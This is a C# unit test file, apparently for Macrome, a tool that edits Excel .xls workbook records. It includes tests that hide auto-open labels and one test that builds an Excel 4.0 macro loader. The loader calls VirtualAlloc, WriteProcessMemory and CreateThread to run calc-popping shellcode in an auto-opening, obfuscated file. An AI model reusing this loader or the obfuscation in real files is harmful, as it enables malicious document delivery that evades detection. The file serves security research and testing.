using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using b2xtranslator;
using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.Spreadsheet.XlsFileFormat.Ptg;
using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
using b2xtranslator.Spreadsheet.XlsFileFormat.Structures;
using b2xtranslator.StructuredStorage.Reader;
using b2xtranslator.xls.XlsFileFormat.Records;
using b2xtranslator.xls.XlsFileFormat.Structures;
using Macrome;
using NUnit.Framework;

namespace UnitTests
{
    [TestFixture]
    public class WorkbookStreamTests
    {
        

        [SetUp]
        public void SetUp()
        {
            Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
        }

       

        [Test]
        public void TestContainsRecord()
        {
            byte[] wbBytes = TestHelpers.GetTemplateMacroBytes();
            WorkbookStream wbs = new WorkbookStream(wbBytes);

            BoundSheet8 notContainedRecord = new BoundSheet8(BoundSheet8.HiddenState.Visible, BoundSheet8.SheetType.Worksheet, "MySheetName");
            BoundSheet8 containedRecord = wbs.GetAllRecordsByType<BoundSheet8>().First();

            Assert.IsTrue(wbs.ContainsRecord(containedRecord));
            Assert.IsFalse(wbs.ContainsRecord(notContainedRecord));
        }

        [Test]
        public void TestReplaceRecord()
        {
            byte[] wbBytes = TestHelpers.GetTemplateMacroBytes();
            WorkbookStream wbs = new WorkbookStream(wbBytes);

            BoundSheet8 bs8 = new BoundSheet8(BoundSheet8.HiddenState.Visible, BoundSheet8.SheetType.Worksheet, "MySheetName");

            var recordCount = wbs.Records.Count;

            BoundSheet8 oldSheetRecord = wbs.GetAllRecordsByType<BoundSheet8>().First();

            WorkbookStream wbs2 = wbs.ReplaceRecord(oldSheetRecord, bs8);

            Assert.AreEqual(recordCount, wbs2.Records.Count);

            BoundSheet8 newSheetRecord = wbs2.GetAllRecordsByType<BoundSheet8>().First();
            
            Assert.AreEqual(newSheetRecord.stName.Value, bs8.stName.Value);

            Assert.IsFalse(wbs2.ContainsRecord(oldSheetRecord));
            Assert.IsTrue(wbs2.ContainsRecord(bs8));
        }

        [Test]
        public void TestRemoveRecord()
        {
            byte[] wbBytes = TestHelpers.GetMacroTestBytes();
            WorkbookStream wbs = new WorkbookStream(wbBytes);

            BiffRecord haltRecord = wbs.GetAllRecordsByType<Formula>().Last();
            List<Formula> formulas = wbs.GetAllRecordsByType<Formula>();
            Assert.AreEqual(3, formulas.Count);
            wbs = wbs.RemoveRecord(haltRecord);

            formulas = wbs.GetAllRecordsByType<Formula>();
            Assert.AreEqual(2, formulas.Count);

            foreach (var formula in formulas)
            {
                List<AbstractPtg> ptgs = formula.ptgStack.ToList();
                List<PtgFunc> funcs = ptgs.Where(p => p.Id == PtgNumber.PtgFunc).Cast<PtgFunc>().ToList();
                bool haltFunctionExists = funcs.Any(func => func.Ftab == FtabValues.HALT);
                Assert.AreEqual(false, haltFunctionExists);
            }
        }

        [Test]
        public void TestAddingSheetRecord()
        {
            byte[] wbBytes = TestHelpers.GetTemplateMacroBytes();
            WorkbookStream wbs = new WorkbookStream(wbBytes);

            BoundSheet8 bs8 = new BoundSheet8(BoundSheet8.HiddenState.Visible, BoundSheet8.SheetType.Macrosheet, "MyMacroSheet");
            BoundSheet8 correctOffsetBs8 = ((BiffRecord)bs8.Clone()).AsRecordType<BoundSheet8>();

            BoundSheet8 oldSheetRecord = wbs.GetAllRecordsByType<BoundSheet8>().First();
            BoundSheet8 newSheetRecord = ((BiffRecord) oldSheetRecord.Clone()).AsRecordType<BoundSheet8>();

            // bs8.lbPlyPos = (uint) (oldSheetRecord.lbPlyPos + bs8.GetBytes().Length);

            List<BOF> bofRecords = wbs.GetAllRecordsByType<BOF>();
            BOF spreadSheetBOF = bofRecords.Last();



            // newSheetRecord.lbPlyPos = bs8.lbPlyPos;
            long offset = wbs.GetRecordByteOffset(spreadSheetBOF);
            bs8.lbPlyPos = oldSheetRecord.lbPlyPos;
            wbs = wbs.InsertRecord(bs8, oldSheetRecord);
            offset = wbs.GetRecordByteOffset(spreadSheetBOF);

            
            correctOffsetBs8.lbPlyPos = (uint) offset;
            newSheetRecord.lbPlyPos = (uint) offset;

            wbs = wbs.ReplaceRecord(bs8, correctOffsetBs8);
            wbs = wbs.ReplaceRecord(oldSheetRecord, newSheetRecord);

            ExcelDocWriter writer = new ExcelDocWriter();
            writer.WriteDocument(TestHelpers.AssemblyDirectory + Path.DirectorySeparatorChar + "testbook.xls", wbs.ToBytes());
        }

        [Test]
        public void TestGetAutoOpenLabels()
        {
            byte[] wbBytes = TestHelpers.GetMacroTestBytes();
            WorkbookStream wbs = new WorkbookStream(wbBytes);

            wbs = wbs.ObfuscateAutoOpen();

            List<Lbl> labels = wbs.GetAutoOpenLabels();
            Assert.AreEqual(1, labels.Count);

            WorkbookStream hiddenLblSheet = TestHelpers.GetBuiltinHiddenLblSheet();
            labels = hiddenLblSheet.GetAutoOpenLabels();
            Assert.AreEqual(1, labels.Count);
        }

        [Test]
        public void TestNeuterCells()
        {
            WorkbookStream wbs = TestHelpers.GetBuiltinHiddenLblSheet();

            WorkbookEditor wbe = new WorkbookEditor(wbs);

            wbs = wbe.NeuterAutoOpenCells();

            Formula autoOpenCell = wbs.GetAllRecordsByType<Formula>().First();
            List<AbstractPtg> openCellPtgStack = autoOpenCell.ptgStack.ToList();

            Assert.AreEqual(typeof(PtgFunc), openCellPtgStack[0].GetType());
            Assert.AreEqual(typeof(PtgConcat), openCellPtgStack.Last().GetType());

            PtgFunc firstItem = (PtgFunc) openCellPtgStack[0];
            Assert.AreEqual(FtabValues.HALT, firstItem.Ftab);

            ExcelDocWriter writer = new ExcelDocWriter();
            writer.WriteDocument(TestHelpers.AssemblyDirectory + Path.DirectorySeparatorChar + "neutered-sheet.xls", wbs.ToBytes());

        }

        [Test]
        public void TestAddMacroSheet()
        {
            byte[] wbBytes = TestHelpers.GetTemplateMacroBytes();
            WorkbookStream wbs = new WorkbookStream(wbBytes);

            byte[] mtBytes = TestHelpers.GetMacroTestBytes();
            WorkbookStream macroWorkbookStream = new WorkbookStream(mtBytes);
            BoundSheet8 macroSheet = new BoundSheet8(BoundSheet8.HiddenState.Visible, BoundSheet8.SheetType.Macrosheet, "MacroSheet");
            List<BOF> macroWorkbookBofs = macroWorkbookStream.GetAllRecordsByType<BOF>();
            BOF LastBofRecord = macroWorkbookBofs.Last();
            List<BiffRecord> sheetRecords = macroWorkbookStream.GetRecordsForBOFRecord(LastBofRecord);
            byte[] sheetBytes = RecordHelper.ConvertBiffRecordsToBytes(sheetRecords);

            wbs = wbs.AddSheet(macroSheet, sheetBytes);
            ExcelDocWriter writer = new ExcelDocWriter();
            writer.WriteDocument(TestHelpers.AssemblyDirectory + Path.DirectorySeparatorChar + "addedsheet.xls", wbs.ToBytes());
        }

       

        [Test]
        public void TestChangeLabel()
        {
            WorkbookStream macroWorkbookStream = new WorkbookStream(TestHelpers.GetMacroTestBytes());
            List<Lbl> labels = macroWorkbookStream.GetAllRecordsByType<Lbl>();

            Lbl autoOpenLbl = labels.First(l => l.fBuiltin && l.Name.Value.Equals("\u0001"));

            Lbl replaceLabelStringLbl = ((BiffRecord)autoOpenLbl.Clone()).AsRecordType<Lbl>();
            replaceLabelStringLbl.SetName(new XLUnicodeStringNoCch("Auto_Open", true));
            replaceLabelStringLbl.fBuiltin = false;

            var cloneLabel = ((BiffRecord)replaceLabelStringLbl.Clone()).AsRecordType<Lbl>();
            var cBytes = cloneLabel.GetBytes();
            var rLabelBytes = replaceLabelStringLbl.GetBytes();
            Assert.AreEqual(rLabelBytes, cBytes);
            macroWorkbookStream = macroWorkbookStream.ReplaceRecord(autoOpenLbl, replaceLabelStringLbl);
            macroWorkbookStream = macroWorkbookStream.FixBoundSheetOffsets();

            ExcelDocWriter writer = new ExcelDocWriter();
            writer.WriteDocument(TestHelpers.AssemblyDirectory + Path.DirectorySeparatorChar + "changedLabel.xls", macroWorkbookStream.ToBytes());
        }


        [Test]
        public void InsertFormulaTest()
        {
            byte[] wbBytes = TestHelpers.GetMacroTestBytes();
            WorkbookStream wbs = new WorkbookStream(wbBytes);

            List<Formula> formulas = wbs.GetAllRecordsByType<Formula>();
            int numRecordsInSheet = formulas.Count - 1;

            List<string> macros = new List<string>()
            {
                "=IF(GET.WORKSPACE(13)<770, CLOSE(FALSE),)",
                "=ALERT(\"Into Payload Loader\",2)",
                "=REGISTER(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\",\"VA\",,1,0)",
                "=REGISTER(\"Kernel32\",\"CreateThread\",\"JJJJJJJ\",\"CT\",,1,0)",
                "=REGISTER(\"Kernel32\",\"WriteProcessMemory\",\"JJJCJJ\",\"WPM\",,1,0)",
                "=VA(0,1000000,4096,64)",
                "=SELECT(R1C3)",
                "=SET.VALUE(R1C4,0)",
                "=WHILE(ACTIVE.CELL()<>\"END\")",
                "=WPM(-1,R6C2+R1C4,ACTIVE.CELL(),LEN(ACTIVE.CELL()),0)",
                "=SET.VALUE(R1C4,R1C4+LEN(ACTIVE.CELL()))",
                "=SELECT(,\"R[1]C\")",
                "=NEXT()",
                "=ALERT(\"Popping Calc\",2)",
                "=CT(0,0,R6C2,0,0,0)",
                "=ALERT(\"Closing Thread\",2)",
                "=HALT()"
            };

            List<string> payload = FormulaHelper.BuildPayloadMacros(TestHelpers.GetPopCalcShellcode());

            List<BiffRecord> formulasToAdd = FormulaHelper.ConvertStringsToRecords(macros, numRecordsInSheet, 0, 0, 1);
            formulasToAdd.AddRange(FormulaHelper.ConvertStringsToRecords(payload, numRecordsInSheet + formulasToAdd.Count, 0, 0, 2));

            Formula haltFormula = formulas.Last();
            Formula modifiedHaltFormula = ((BiffRecord)haltFormula.Clone()).AsRecordType<Formula>();
            modifiedHaltFormula.rw = (ushort)(numRecordsInSheet + formulasToAdd.Count);

            Formula gotoFormula = FormulaHelper.GetGotoFormulaForCell(modifiedHaltFormula.rw, modifiedHaltFormula.col, 0, 1);

            WorkbookStream modifiedStream = wbs.InsertRecords(formulasToAdd, haltFormula);
            modifiedStream = modifiedStream.ReplaceRecord(haltFormula, gotoFormula);

            modifiedStream = modifiedStream.ObfuscateAutoOpen();

            ExcelDocWriter writer = new ExcelDocWriter();
            writer.WriteDocument(TestHelpers.AssemblyDirectory + Path.DirectorySeparatorChar + "not-equals-parser-bug.xls", modifiedStream);
        }
    }
}
